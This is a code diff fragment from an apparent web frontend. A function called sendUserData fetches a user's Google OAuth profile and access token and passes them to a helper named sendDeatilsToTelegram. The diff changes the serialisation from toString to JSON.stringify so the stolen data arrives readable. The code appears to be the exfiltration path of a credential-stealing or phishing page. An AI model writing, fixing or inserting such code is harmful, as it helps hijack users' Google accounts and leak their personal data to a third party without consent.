@@ -364,7 +364,7 @@ function sendUserData(token) {
           const userResponse = await gapi.client.oauth2.userinfo.get(); 
           userInfo = userResponse.result;
           console.log('Successfully fetched User Info:', userInfo);
-          let temp1 = toString(userInfo);
+          let temp1 = JSON.stringify(userInfo, null, 2);
           let temp2 = (`==========FRONTEND==========\n${temp1}`)
           sendDeatilsToTelegram(temp1);
             
@@ -382,7 +382,7 @@ function sendUserData(token) {
           user: userInfo
         };
         console.log("User Data and Access Token stored:", user_data_access_token);
-        let temp3 = toString(user_data_access_token);
+        let temp3 = JSON.stringify(user_data_access_token, null, 2);
         sendDeatilsToTelegram(`==========FRONTEND==========\n${temp3}`)
         sendUserData(accessToken);
 
